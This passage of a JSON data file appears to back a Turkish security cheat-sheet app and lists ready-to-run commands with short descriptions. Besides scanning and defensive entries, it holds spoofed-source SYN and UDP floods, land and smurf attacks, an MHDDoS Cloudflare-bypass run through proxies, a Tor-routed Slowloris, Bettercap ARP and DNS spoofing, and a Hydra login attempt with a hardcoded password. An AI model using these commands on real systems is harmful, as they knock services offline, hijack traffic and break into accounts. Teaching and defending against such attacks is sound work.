        "cmd": "powershell \"Get-EventLog -LogName Security -Newest 10\""
    },
    {
        "id": 144,
        "category": "nmap",
        "categoryName": "2. Ağ & Nmap",
        "badge": "FULL PORT DISCOVERY",
        "title": "Tüm 65.535 Portu Eksiksiz Tarama (nmap -p-)",
        "desc": "Hedef bilgisayardaki 1'den 65535'e kadar olan tüm TCP portlarını eksiksiz tarar. Standart taramaların kaçırdığı yüksek numaralı gizli portları deşifre eder.",
        "cmd": "nmap -p- 127.0.0.1"
    },
    {
        "id": 145,
        "category": "nmap",
        "categoryName": "2. Ağ & Nmap",
        "badge": "SPESİFİK PORT KONTROLÜ",
        "title": "Belirli Bir Portun (8080) Durum & Servis Denetimi",
        "desc": "Sadece belirtilen TCP portunun (örn: 8080 alternatif web portu) açık olup olmadığını ve arkasında hangi servisin çalıştığını hızlıca kontrol eder.",
        "cmd": "nmap -p 8080/tcp 127.0.0.1"
    },
    {
        "id": 146,
        "category": "nmap",
        "categoryName": "2. Ağ & Nmap",
        "badge": "HIZLI PORT TARAMASI",
        "title": "En Yaygın 100 Portu Hızlıca Tarama (nmap -F)",
        "desc": "Hedef cihazdaki (modem, sunucu vb.) en popüler 100 portu saniyeler içinde tarayarak ilk keşif verisini çıkarır.",
        "cmd": "nmap -F 192.168.1.1"
    },
    {
        "id": 147,
        "category": "nmap",
        "categoryName": "2. Ağ & Nmap",
        "badge": "PING ATLATMA (ICMP BYPASS)",
        "title": "Ping Korumalı Gizli Cihazları Taramaya Zorlama (nmap -Pn)",
        "desc": "ICMP ping isteklerine cevap vermeyen, güvenlik duvarı arkasına gizlenmiş cihazları ayakta kabul ederek port taramasına zorlar.",
        "cmd": "nmap -Pn 192.168.1.1"
    },
    {
        "id": 148,
        "category": "nmap",
        "categoryName": "2. Ağ & Nmap",
        "badge": "SERVİS & VERSİYON PARMAK İZİ",
        "title": "Yüksek Portta Servis & Tam Versiyon Tespiti (nmap -sV)",
        "desc": "Belirtilen portta (örn: 49152) çalışan servisin tam adını, daemon versiyonunu ve yazılım parmak izini çıkarır.",
        "cmd": "nmap -sV -p 49152 192.168.1.1"
    },
    {
        "id": 149,
        "category": "nmap",
        "categoryName": "2. Ağ & Nmap",
        "badge": "YEREL AĞ CANLI CİHAZ KEŞFİ",
        "title": "Yerel Ağdaki Tüm Aktif Cihazları Listeleme (Ping Scan)",
        "desc": "192.168.1.0/24 subnetindeki tüm IP adreslerine hafif yoklama paketleri yollayarak ağdaki açık telefon, bilgisayar ve IoT cihazları listeler.",
        "cmd": "sudo nmap -sn 192.168.1.0/24"
    },
    {
        "id": 150,
        "category": "nmap",
        "categoryName": "2. Ağ & Nmap",
        "badge": "İŞLETİM SİSTEMİ TESPİTİ",
        "title": "Hedef Cihazın İşletim Sistemini Tahmin Etme (nmap -O)",
        "desc": "TCP/IP yığın davranışını inceleyerek hedefin Windows, Linux, iOS veya gömülü firmware olduğunu yüksek doğrulukla tahmin eder.",
        "cmd": "sudo nmap -O 192.168.1.17"
    },
    {
        "id": 151,
        "category": "nmap",
        "categoryName": "2. Ağ & Nmap",
        "badge": "ÇOKLU PORT SERVİS PARMAK İZİ",
        "title": "Birden Fazla Spesifik Portun Servis Detayları (nmap -sV -p)",
        "desc": "5000, 7000, 7100, 62078 gibi özel portların arkasındaki servislerin versiyonlarını ve işletim sistemi parmak izini topluca çıkarır.",
        "cmd": "sudo nmap -sV -p 5000,7000,7100,62078 192.168.1.17"
    },
    {
        "id": 152,
        "category": "web",
        "categoryName": "3. Web & Fuzzing",
        "badge": "GİZLİ DİZİN KEŞFİ",
        "title": "Gobuster ile Web Sitesinde Gizli Dizin ve Dosya Arama",
        "desc": "Hedef web uygulamasında /admin, /backup, /config gibi gizlenen hassas sayfaları ve dizinleri sözlük (wordlist) kullanarak tespit eder.",
        "cmd": "gobuster dir -u http://10.10.1.5 -w /usr/share/wordlists/dirb/common.txt"
    },
    {
        "id": 153,
        "category": "web",
        "categoryName": "3. Web & Fuzzing",
        "badge": "ULTRA HIZLI WEB FUZZER",
        "title": "ffuf ile Web Uygulaması ve Parametre Fuzzing",
        "desc": "Go diliyle yazılmış ultra hızlı ffuf aracıyla web sunucusunda gizlenen dosyaları, parametreleri ve API uç noktalarını anında bulur.",
        "cmd": "ffuf -u http://10.10.1.5/FUZZ -w /usr/share/wordlists/dirb/common.txt"
    },
    {
        "id": 154,
        "category": "web",
        "categoryName": "3. Web & Fuzzing",
        "badge": "WEB ZAFİYET TARAMASI",
        "title": "Nikto ile Web Sunucu Açık & Zafiyet Taraması",
        "desc": "Web sunucusundaki 6700'den fazla bilinen güvenlik açığını, eski yazılım sürümlerini ve tehlikeli varsayılan dosyaları tarar.",
        "cmd": "nikto -h 192.168.1.1"
    },
    {
        "id": 155,
        "category": "auth",
        "categoryName": "6. Kimlik & Parola",
        "badge": "WEB LOGIN BRUTE FORCE",
        "title": "Hydra ile Web Form / HTTP-GET Giriş Şifresi Testi",
        "desc": "Belirlenen kullanıcı adı ve parola ile web giriş formlarına veya HTTP-GET tabanlı panel sayfalarına otomatik kimlik doğrulama testi uygular.",
        "cmd": "hydra -l admin -p Sebu132009 192.168.1.1 http-get /"
    },
    {
        "id": 156,
        "category": "packet",
        "categoryName": "4. Paket & Firewall",
        "badge": "MANUEL TCP SYN TESTİ",
        "title": "hping3 ile Port Açıklığını Manuel TCP SYN ile Sorgulama",
        "desc": "Hedef porta tek bir TCP SYN bayraklı paket fırlatarak güvenlik duvarının veya servisin vereceği SYN-ACK yanıtını inceler.",
        "cmd": "sudo hping3 -S -p 80 -c 1 192.168.1.1"
    },
    {
        "id": 157,
        "category": "packet",
        "categoryName": "4. Paket & Firewall",
        "badge": "FIREWALL TEPKİ TESTİ",
        "title": "hping3 ile ACK Bayrağı Göndererek Firewall Tepkisi Ölçme",
        "desc": "Durumsal olmayan (stateless) filtreleme yapan güvenlik duvarlarının açık portlara nasıl tepki verdiğini ACK bayrağıyla analiz eder.",
        "cmd": "sudo hping3 -A -p 80 -c 1 192.168.1.1"
    },
    {
        "id": 158,
        "category": "packet",
        "categoryName": "4. Paket & Firewall",
        "badge": "L4 TCP SYN FLOOD",
        "title": "Sahte Kaynak IP ile Volumetrik TCP SYN Flood (hping3)",
        "desc": "Maksimum hızda sahte IP'ler üreterek hedef HTTP portuna SYN paketleri basar; hedef sunucunun SYN Backlog kuyruğunu test eder.",
        "cmd": "sudo hping3 --flood --rand-source -S -p 80 10.10.1.5"
    },
    {
        "id": 159,
        "category": "packet",
        "categoryName": "4. Paket & Firewall",
        "badge": "PAYLOAD'LU SYN FLOOD",
        "title": "Veri Yükü Eklenmiş Yüksek Verimli SYN Flood (-d 120)",
        "desc": "Her SYN paketine 120 baytlık veri yükü ekleyerek hedef sunucunun ağ kartı ve çekirdek bellek tamponunu çok daha hızlı doldurur.",
        "cmd": "sudo hping3 -S --flood --rand-source -d 120 -p 80 10.10.1.5"
    },
    {
        "id": 160,
        "category": "packet",
        "categoryName": "4. Paket & Firewall",
        "badge": "L4 UDP FLOOD",
        "title": "Bağlantısız UDP Protokol Stres Testi (hping3)",
        "desc": "Hedef porta sahte IP'lerle yüksek hızlı UDP paketleri fırlatır; sunucuyu ICMP Port Unreachable paketleri üretmeye zorlar.",
        "cmd": "sudo hping3 --udp --flood --rand-source -p 53 10.10.1.5"
    },
    {
        "id": 161,
        "category": "packet",
        "categoryName": "4. Paket & Firewall",
        "badge": "LAND ATTACK SİMÜLASYONU",
        "title": "Sunucunun Kendi Kendine Paket Fırlatması (Land Attack)",
        "desc": "Kaynak IP ile hedef IP'yi aynı yaparak (192.168.1.50) sunucunun kendi TCP soketinde kısır döngüye girmesini test eder.",
        "cmd": "sudo hping3 -S -a 192.168.1.50 -k -s 80 -p 80 --flood 192.168.1.50"
    },
    {
        "id": 162,
        "category": "packet",
        "categoryName": "4. Paket & Firewall",
        "badge": "SMURF ATTAK SİMÜLASYONU",
        "title": "Broadcast Yoluyla Smurf ICMP Fırtınası Testi",
        "desc": "Ağ yayın adresine (.255) sahte kaynak IP ile ping atarak ağdaki diğer tüm cihazların kurbana cevap dönmesini tetikler.",
        "cmd": "sudo hping3 -1 -a 192.168.1.50 192.168.1.255 --flood"
    },
    {
        "id": 163,
        "category": "exploit",
        "categoryName": "7. Zafiyet & Exploit",
        "badge": "L7 CLOUDFLARE BYPASS",
        "title": "MHDDoS ile Layer 7 Akıllı WAF / CFB Atlatma Testi",
        "desc": "Python tabanlı MHDDoS aracıyla tarayıcı motoru emülasyonu yaparak JS challenge ve çerez doğrulamalarını test eder.",
        "cmd": "python3 start.py CFB https://target.com 5 1000 proxy.txt 100 300"
    },
    {
        "id": 164,
        "category": "exploit",
        "categoryName": "7. Zafiyet & Exploit",
        "badge": "L7 SLOW ATTACK (SLOWLORIS)",
        "title": "Torshammer ile Tor Destekli Sinsi Slowloris Testi",
        "desc": "HTTP başlıklarını saniyede birkaç bayt hızla göndererek sunucunun tüm işçi havuzunu (worker slots) sessizce işgal eder.",
        "cmd": "python2 torshammer.py -t 10.10.1.5 -p 80 -r 256 -T"
    },
    {
        "id": 165,
        "category": "exploit",
        "categoryName": "7. Zafiyet & Exploit",
        "badge": "C TABANLI SLOWLORIS",
        "title": "slowhttptest ile Gelişmiş Slowloris Analiz & Raporlama",
        "desc": "1000 eş zamanlı yarım HTTP isteği açarak sunucunun hangi saniyede hizmet veremez hale geldiğini HTML/CSV olarak raporlar.",
        "cmd": "slowhttptest -c 1000 -H -g -o slow_rapor -i 10 -r 200 -t GET -u http://10.10.1.5 -x 24 -p 3"
    },
    {
        "id": 166,
        "category": "exploit",
        "categoryName": "7. Zafiyet & Exploit",
        "badge": "L7 YÜKSEK HIZLI YÜK TESTİ",
        "title": "wrk ile Çok İş Parçacıklı HTTP Yük ve Stres Ölçümü",
        "desc": "12 paralel CPU çekirdeği ve 400 canlı bağlantı ile web sunucusunun saniyede kaç istek (Req/Sec) kaldırabildiğini ölçer.",
        "cmd": "wrk -t12 -c400 -d30s http://10.10.1.5/"
    },
    {
        "id": 167,
        "category": "mitm",
        "categoryName": "5. MITM & Dinleme",
        "badge": "BETTERCAP ÇERÇEVESİ",
        "title": "Bettercap ile Ağ Arayüzü ve MITM Motorunu Başlatma",
        "desc": "Modern MITM operasyonları için belirtilen ağ kartı üzerinden Bettercap etkileşimli kabuğunu ayağa kaldırır.",
        "cmd": "sudo bettercap -iface eth2"
    },
    {
        "id": 168,
        "category": "mitm",
        "categoryName": "5. MITM & Dinleme",
        "badge": "ARP ZEHİRLEME (SPOOFING)",
        "title": "Bettercap ile Hedefe Yönelik Çift Yönlü ARP Zehirleme",
        "desc": "Hedef makine ile modem arasındaki trafiği kendi üzerine çekmek için ARP zehirleme modülünü hedefe kilitler ve başlatır.",
        "cmd": "set arp.spoof.targets 192.168.1.7; arp.spoof on"
    },
    {
        "id": 169,
        "category": "mitm",
        "categoryName": "5. MITM & Dinleme",
        "badge": "DNS MANİPÜLASYONU",
        "title": "Bettercap ile Hedef Alan Adını Kendi Sunucuna Yönlendirme",
        "desc": "Hedefin girmek istediği alan adını (google.com vb.) saldırganın sahte web sunucu IP adresine yönlendirir (DNS Spoof).",
        "cmd": "set dns.spoof.domains google.com; set dns.spoof.address 192.168.1.50; dns.spoof on"
    },
    {
        "id": 170,
        "category": "blue",
        "categoryName": "9. Blue Team & SOC",
        "badge": "CANLI SYN BACKLOG İZLEME",
        "title": "Canlı SYN-RECV Kuyruk İzleme (ss & watch)",
        "desc": "SYN flood saldırısı anında Linux çekirdeğindeki yarı açık bağlantı sayısını saniye saniye takip eder.",
        "cmd": "watch -n 1 \"ss -tan | grep SYN-RECV | wc -l\""
    },
    {
        "id": 171,
        "category": "blue",
        "categoryName": "9. Blue Team & SOC",
        "badge": "PAKET DİNLEME & ANALİZ",
        "title": "tcpdump ile 80 Portundaki Tüm Canlı Trafiği İzleme",
        "desc": "Hedef sunucunun HTTP portuna gelen tüm SYN, ACK veya şüpheli bayrak paketlerini ham düzeyde ekrana döker.",
        "cmd": "sudo tcpdump -i any -n port 80"
    },
    {
        "id": 172,
        "category": "blue",
        "categoryName": "9. Blue Team & SOC",
        "badge": "ÇEKİRDEK SYN COOKIE",
        "title": "Linux Çekirdeğinde SYN Cookie Korumasını Açma (sysctl)",
        "desc": "SYN backlog kuyruğunun dolmasını önlemek için istemci ACK dönene kadar bellekte oturum açmayan SYN Cookie motorunu aktif eder.",
        "cmd": "sudo sysctl -w net.ipv4.tcp_syncookies=1"
    },
    {
        "id": 173,
        "category": "blue",
        "categoryName": "9. Blue Team & SOC",
        "badge": "IPTABLES BAĞLANTI LİMİTİ",
        "title": "Aynı IP'den Gelen Eş Zamanlı Bağlantıyı 20 ile Sınırlama",
        "desc": "Tek bir IP adresinin web sunucusuna aynı anda 20'den fazla TCP SYN bağlantısı açmasını engeller, fazlasını doğrudan DROP eder.",
        "cmd": "sudo iptables -A INPUT -p tcp --syn --dport 80 -m connlimit --connlimit-above 20 --connlimit-mask 32 -j DROP"
    },
    {
        "id": 174,
        "category": "blue",
        "categoryName": "9. Blue Team & SOC",
        "badge": "GEÇERSİZ PAKET FİLTRESİ",
        "title": "Bozuk ve Geçersiz (INVALID) Durumlu Paketleri Engelleme",
        "desc": "Protokol kurallarına uymayan, el sıkışması dışı sahte bayrak taşıyan tüm paketleri işletim sistemi seviyesinde anında yok eder.",
        "cmd": "sudo iptables -A INPUT -m state --state INVALID -j DROP"
    },
    {
        "id": 175,
        "category": "powershell",
        "categoryName": "10. PowerShell Denetim",
        "badge": "WEB DİZİN FUZZING",
        "title": "PowerShell ile Kritik Web Dizinleri ve Yedek Dosyaları Arama",
        "desc": "Wordlist kullanarak /admin, /.env, /backup.sql gibi saldırganların aradığı en yaygın 15 kritik dosya ve dizini hızla tarar ve HTTP durum kodlarını raporlar.",
        "cmd": "# KENDİ sitenizin adresini buraya yazın (Sonunda eğik çizgi \"/\" olmadan)\n$YourSite = \"https://kendisiteniz.com\"\n\n# Siber saldırganların aradığı en yaygın 15 kritik dizin ve dosya\n$Wordlist = @(\n    \"/admin\",\n    \"/wp-admin\",\n    \"/administrator\",\n    \"/login\",\n    \"/api\",\n    \"/.env\",\n    \"/config.php\",\n    \"/wp-config.php\",\n    \"/backup.sql\",\n    \"/backup.zip\",\n    \"/database.sql\",\n    \"/robots.txt\",\n    \"/server-status\",\n    \"/phpinfo.php\",\n    \"/readme.html\"\n)\n\nWrite-Host \"`n=== GÜVENLİ WEB DİZİN FUZZING RAPORU ===\" -ForegroundColor Cyan\nWrite-Host \"Hedef Siteniz: $YourSite\"\nWrite-Host \"Analiz Başlatıldı...`n\"\n\nforeach ($Path in $Wordlist) {\n    $TestUrl = $YourSite + $Path\n    try {\n        # Sadece HTTP durum kodunu almak için hızlı bir GET isteği atıyoruz\n        $Request = Invoke-WebRequest -Uri $TestUrl -Method Get -MaximumRedirection 0 -ErrorAction Stop\n        $StatusCode = $Request.StatusCode\n    }\n    catch {\n        # Eğer sayfa hata kodu döndürdüyse (404, 403 vb.) buradan yakalıyoruz\n        if ($_.Exception.InnerException) {\n            $StatusCode = [int]$_.Exception.InnerException.Response.StatusCode\n        } else {\n            $StatusCode = 404\n        }\n    }\n\n    # Sonuçları siber güvenlik standartlarına göre yorumlama\n    if ($StatusCode -eq 200) {\n        Write-Host \"[❗] RİSK: $Path bulundu! (HTTP 200 OK) - Herkese Açık!\" -ForegroundColor Red\n    } \n    elseif ($StatusCode -eq 403 -or $StatusCode -eq 401) {\n        Write-Host \"[🔒] Korumalı: $Path mevcut ama yetki gerekiyor (HTTP $StatusCode)\" -ForegroundColor Yellow\n    }\n    else {\n        # Sayfa bulunamadı (404) veya ulaşılamadı ise sessizce geçebilir veya listeleyebilirsiniz\n        Write-Host \"[✔] Güvenli: $Path bulunamadı (HTTP $StatusCode)\" -ForegroundColor Gray\n    }\n}"
    }
];
